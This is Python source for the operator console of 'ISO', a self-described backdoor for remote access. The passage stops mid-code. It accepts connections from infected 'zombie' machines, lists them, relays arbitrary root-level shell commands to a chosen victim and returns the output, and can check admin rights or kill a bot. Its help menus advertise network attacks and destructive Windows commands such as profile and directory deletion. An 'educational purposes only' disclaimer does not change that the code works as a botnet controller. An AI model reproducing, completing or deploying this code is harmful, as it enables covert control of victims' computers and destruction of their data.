'''

            ISO - In Side Out
            
        created by CookiesKush420
           github.com/Callumgm
       
       
    This a highly sophisticated backdoor that can be
    used to gain access to a target machine and execute terminal commands.
    
    CREATED FOR EDUCATIONAL PURPOSES ONLY.
     
'''

### System Modules ###
import os
import ctypes
import socket

from threading import Thread
from typing import Tuple
from time import sleep

### Downloaded Modules ###
import requests

from pystyle import Colorate, Colors
from cookies_package import clear
from colorama import Fore

### Local Modules ###
from util.globe.init import *

#region Colors
MAGENTA = Fore.MAGENTA
YELLOW  = Fore.YELLOW
GREEN   = Fore.GREEN
RESET   = Fore.RESET
WHITE   = Fore.WHITE
CYAN 	  = Fore.CYAN
BLUE 	  = Fore.BLUE
RED 	  = Fore.RED

#region Unicode
sdl 	  = "\u2551" 	# Vertical Line
sal 	  = "\u2550" 	# Horizontal Line
dll 	  = "\u2554"	# Down Left Corner
drl 	  = "\u255A"	# Down Right Corner
dot	  	  = "\u2022"	# Dot
#endregion

#endregion


IP   = "192.168.0.2"
PORT = int("1888")


class Server():
	#region Server Functions
	def __init__(self, connect:Tuple[str,int]=(IP, PORT)):
		self.connect = connect
		ctypes.windll.kernel32.SetConsoleTitleW(f"ISO | Zombies: [0] | Port: [{PORT}] | Subscription: [Basic] | CookiesKush420#9599")
		super().__init__()
		download_gif()

		self.COLOR_BORDER = Fore.CYAN
		self.COLOR_MAIN   = Fore.GREEN

		self.temp 			 = os.getenv('temp')
		self.input 			 = f"\n\t{self.COLOR_BORDER}{dll}{sal}{sal}{sal}[{self.COLOR_BORDER}root{self.COLOR_MAIN}@{self.COLOR_BORDER}ISO]\n\t{drl}{sal}{sal}> {RESET}"
		self.stop 			 = False

		self.public_ips 	 = []
		self.all_connections = []
		self.all_address 	 = []
	
	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen(50)
		self.sock.settimeout(0.5)
	
		Thread(target=self.collect).start()
		Thread(target=self.check).start()

		return True
	
	def collect(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout:
				continue
			except socket.socket_error:
				continue
			except Exception as e:
				print("Error accepting connections")

	def check(self, display:bool=False, always:bool=True):
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections):
				c+=1
				try:
					tcp.send(str.encode("ping"))
					if tcp.recv(1024).decode("utf-8") and display: print("")
				except:
					if display: print("")
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always: break
			sleep(0.5)
	#endregion

	#region Server Console Functions
	def worker(self):
		while True:
			total = 0
			for i, (ip, port) in enumerate(self.all_address): 
				total+=1

			ctypes.windll.kernel32.SetConsoleTitleW(f"ISO | Zombies: [{total}] | Port: [{PORT}] | CookiesKush420#9599")

	def list_clients(self):
		results = ""

		for i, (ip, port) in enumerate(self.all_address): 
			try:
				self.all_connections[i].send("getip".encode())
				out = self.all_connections[i].recv(1024*5).decode("ascii")
				results += f"\n\t[{Fore.CYAN}{i}{Fore.GREEN}]{Fore.RESET}    \t{out}"
			except BrokenPipeError:
				del self.all_address[i]
				del self.all_connections[i]

		print(Fore.GREEN + f"\n\t-------------- {Fore.RESET}Connected Clients{Fore.GREEN} --------------\t\n" + results + Fore.RESET)

	def _root(self, bot:int, public_ip:str):
		clear()
		
		self.second_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}       {self.COLOR_MAIN}Type [{WHITE}exit{self.COLOR_MAIN}] to return to main menu      {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""

		print(self.second_logo)
		print("\n")
		while True:
			r 	 = self.input.replace("ISO", public_ip)
			cmd1 = str(input(r))

			print("\n")

			if cmd1 == "exit" or cmd1 == "quit":
				clear()
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self._take_cmd()
				break

			elif cmd1 == "help":
				
				self.root_windows_help_menu = f"""
{self.COLOR_BORDER}

                                                {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                                {sdl}  {RED}ROOT CMDS WINDOWS{self.COLOR_BORDER}  {sdl}
                          {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                          {sdl}    {self.COLOR_MAIN}rd /s /q         {self.COLOR_BORDER}{sdl}   {WHITE}Remove (or delete) a directory         {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}delprof /q /i    {self.COLOR_BORDER}{sdl}   {WHITE}Delete windows user profiles           {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}getmac           {self.COLOR_BORDER}{sdl}   {WHITE}Display the MAC address                {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}dir              {self.COLOR_BORDER}{sdl}   {WHITE}List directory content                 {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}mkdir            {self.COLOR_BORDER}{sdl}   {WHITE}Create folder                          {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}ipconfig         {self.COLOR_BORDER}{sdl}   {WHITE}Configure IP                           {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}del              {self.COLOR_BORDER}{sdl}   {WHITE}Delete files                           {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}find             {self.COLOR_BORDER}{sdl}   {WHITE}Find files                             {self.COLOR_BORDER}{sdl}
                          {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

                                {YELLOW}To view more all commands goto https://ss64.com/nt/

{RESET}
"""

				print(self.root_windows_help_menu)

			else:
				for i, (ip, port) in enumerate(self.all_address):
					if i == bot:
						try:
							cmd1 = "root " + cmd1
							self.all_connections[i].send(cmd1.encode())
							out = self.all_connections[i].recv(1024*5).decode("utf-8")
							print(f'{YELLOW}=============================================================\n{RESET}{out}\n{YELLOW}============================================================={RESET}\n')
						except BrokenPipeError:
							del self.all_address[i]
							del self.all_connections[i]
	
	def set_colors(self):
		colors = f"""
		
			{self.COLOR_MAIN}1{RESET}) {CYAN}CYAN {RESET}& {GREEN}GREEN
			{self.COLOR_MAIN}2{RESET}) {CYAN}CYAN {RESET}& {RED}RED
			{self.COLOR_MAIN}3{RESET}) {CYAN}CYAN {RESET}& {YELLOW}YELLOW
			{self.COLOR_MAIN}4{RESET}) {CYAN}CYAN {RESET}& {WHITE}WHITE
			{self.COLOR_MAIN}5{RESET}) {CYAN}CYAN {RESET}& {MAGENTA}MAGENTA

			{self.COLOR_MAIN}6{RESET}) {GREEN}GREEN {RESET}& {CYAN}CYAN
			{self.COLOR_MAIN}7{RESET}) {GREEN}GREEN {RESET}& {RED}RED
			{self.COLOR_MAIN}8{RESET}) {GREEN}GREEN {RESET}& {YELLOW}YELLOW
			{self.COLOR_MAIN}9{RESET}) {GREEN}GREEN {RESET}& {WHITE}WHITE
			{self.COLOR_MAIN}10{RESET}) {GREEN}GREEN {RESET}& {MAGENTA}MAGENTA

			{self.COLOR_MAIN}11{RESET}) {RED}RED {RESET}& {CYAN}CYAN
			{self.COLOR_MAIN}12{RESET}) {RED}RED {RESET}& {GREEN}GREEN
			{self.COLOR_MAIN}13{RESET}) {RED}RED {RESET}& {YELLOW}YELLOW
			{self.COLOR_MAIN}14{RESET}) {RED}RED {RESET}& {WHITE}WHITE
			{self.COLOR_MAIN}15{RESET}) {RED}RED {RESET}& {MAGENTA}MAGENTA
		
		"""
		print(colors)
		color = str(input(f"\n\t{RESET}Select Color {RED}: {RESET}"))

		if color == "1":
			print(f"\n\t{RESET}Color Set To {CYAN}CYAN {RESET}& {GREEN}GREEN{RESET}\n")
			self.COLOR_BORDER = Fore.CYAN
			self.COLOR_MAIN   = Fore.GREEN

		elif color == "2":
			print(f"\n\t{RESET}Color Set To {CYAN}CYAN {RESET}& {RED}RED{RESET}\n")
			self.COLOR_BORDER = Fore.CYAN
			self.COLOR_MAIN   = Fore.RED
		
		elif color == "3":
			print(f"\n\t{RESET}Color Set To {CYAN}CYAN {RESET}& {YELLOW}YELLOW{RESET}\n")
			self.COLOR_BORDER = Fore.CYAN
			self.COLOR_MAIN   = Fore.YELLOW

		elif color == "4":
			print(f"\n\t{RESET}Color Set To {CYAN}CYAN {RESET}& {WHITE}WHITE{RESET}\n")
			self.COLOR_BORDER = Fore.CYAN
			self.COLOR_MAIN   = Fore.WHITE

		elif color == "5":
			print(f"\n\t{RESET}Color Set To {CYAN}CYAN {RESET}& {MAGENTA}MAGENTA{RESET}\n")
			self.COLOR_BORDER = Fore.CYAN
			self.COLOR_MAIN   = Fore.MAGENTA

		
		elif color == "6":
			print(f"\n\t{RESET}Color Set To {GREEN}GREEN {RESET}& {CYAN}CYAN{RESET}\n")
			self.COLOR_BORDER = Fore.GREEN
			self.COLOR_MAIN   = Fore.CYAN

		elif color == "7":
			print(f"\n\t{RESET}Color Set To {GREEN}GREEN {RESET}& {RED}RED{RESET}\n")
			self.COLOR_BORDER = Fore.GREEN
			self.COLOR_MAIN   = Fore.RED

		elif color == "8":
			print(f"\n\t{RESET}Color Set To {GREEN}GREEN {RESET}& {YELLOW}YELLOW{RESET}\n")
			self.COLOR_BORDER = Fore.GREEN
			self.COLOR_MAIN   = Fore.YELLOW

		elif color == "9":
			print(f"\n\t{RESET}Color Set To {GREEN}GREEN {RESET}& {WHITE}WHITE{RESET}\n")
			self.COLOR_BORDER = Fore.GREEN
			self.COLOR_MAIN   = Fore.WHITE

		elif color == "10":
			print(f"\n\t{RESET}Color Set To {GREEN}GREEN {RESET}& {MAGENTA}MAGENTA{RESET}\n")
			self.COLOR_BORDER = Fore.GREEN
			self.COLOR_MAIN   = Fore.MAGENTA

		
		elif color == "11":
			print(f"\n\t{RESET}Color Set To {RED}RED {RESET}& {CYAN}CYAN{RESET}\n")
			self.COLOR_BORDER = Fore.RED
			self.COLOR_MAIN   = Fore.CYAN

		elif color == "12":
			print(f"\n\t{RESET}Color Set To {RED}RED {RESET}& {GREEN}GREEN{RESET}\n")
			self.COLOR_BORDER = Fore.RED
			self.COLOR_MAIN   = Fore.GREEN

		elif color == "13":
			print(f"\n\t{RESET}Color Set To {RED}RED {RESET}& {YELLOW}YELLOW{RESET}\n")
			self.COLOR_BORDER = Fore.RED
			self.COLOR_MAIN  = Fore.YELLOW

		elif color == "14":
			print(f"\n\t{RESET}Color Set To {RED}RED {RESET}& {WHITE}WHITE{RESET}\n")
			self.COLOR_BORDER = Fore.RED
			self.COLOR_MAIN   = Fore.WHITE

		elif color == "15":
			print(f"\n\t{RESET}Color Set To {RED}RED {RESET}& {MAGENTA}MAGENTA{RESET}\n")
			self.COLOR_BORDER = Fore.RED
			self.COLOR_MAIN   = Fore.MAGENTA

		else:
			print(f"\n\t{RED}Invalid Choice{RESET}")
			self.set_colors()
	
	#endregion

	def _take_cmd(self):
		cmd = str(input(self.input))
		clear()
		if cmd:
			
			if cmd == "exit" or cmd == "quit":
				os._exit(1)
			
			elif cmd == "list":
				
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""

				print(self.main_logo)
				self.list_clients()

			elif cmd == "setcolors":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.set_colors()

			elif cmd == "help":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
		
				self.help_menu = f"""
{self.COLOR_BORDER}

                                                {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                                {sdl}      {RED}HELP MENU{self.COLOR_BORDER}      {sdl}
                          {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                          {sdl}    {self.COLOR_MAIN}networkattack    {self.COLOR_BORDER}{sdl}   {WHITE}Attack to attack the clients network   {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}networkscan      {self.COLOR_BORDER}{sdl}   {WHITE}Scan the clients network               {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}admincheck       {self.COLOR_BORDER}{sdl}   {WHITE}Check if client is running as admin    {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}setcolors        {self.COLOR_BORDER}{sdl}   {WHITE}Set GUI main and border colors         {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}sysinfo          {self.COLOR_BORDER}{sdl}   {WHITE}Get system infomation                  {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}clear            {self.COLOR_BORDER}{sdl}   {WHITE}Clear console                          {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}root             {self.COLOR_BORDER}{sdl}   {WHITE}Get root access into a machine         {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}list             {self.COLOR_BORDER}{sdl}   {WHITE}List current connected bots            {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}exit             {self.COLOR_BORDER}{sdl}   {WHITE}Close server                           {self.COLOR_BORDER}{sdl}
                          {sdl}    {self.COLOR_MAIN}kill             {self.COLOR_BORDER}{sdl}   {WHITE}Kill client                            {self.COLOR_BORDER}{sdl}
                          {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}
"""

				print(self.help_menu)
			
			elif cmd == "clear":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self._take_cmd()

			elif cmd == "admincheck":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				for i, (ip, port) in enumerate(self.all_address): 
					try:
						self.all_connections[i].send(cmd.encode())	
						print(Fore.GREEN+f'\n\t[{i}]  \t{self.all_connections[i].recv(1024*5).decode("ascii")}')
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]

			elif cmd == "kill":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.list_clients()
				
				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))

				if bot > len(self.all_address) - 1:
					print(RED + "\n\tInvalid Bot Number" + RESET)
					sleep(2)
					clear()
					self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
					print(self.main_logo)
					self._take_cmd()

				else: 
					yesno = bool(input(f"\n\t{RESET}Are you sure you want to kill bot {WHITE}{bot}{RESET} ? (leave empty for no) {RED}: {RESET}"))
					if yesno:
						for i, (ip, port) in enumerate(self.all_address): 
							if i == bot:
								try:
									cmd = "kill"
									self.all_connections[i].send(cmd.encode())	
									print(Fore.GREEN+f'\n\t[{i}]  \t{self.all_connections[i].recv(1024*5).decode("ascii")}')
								except BrokenPipeError:
									del self.all_address[i]
									del self.all_connections[i]
					
					else:
						clear()
						self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
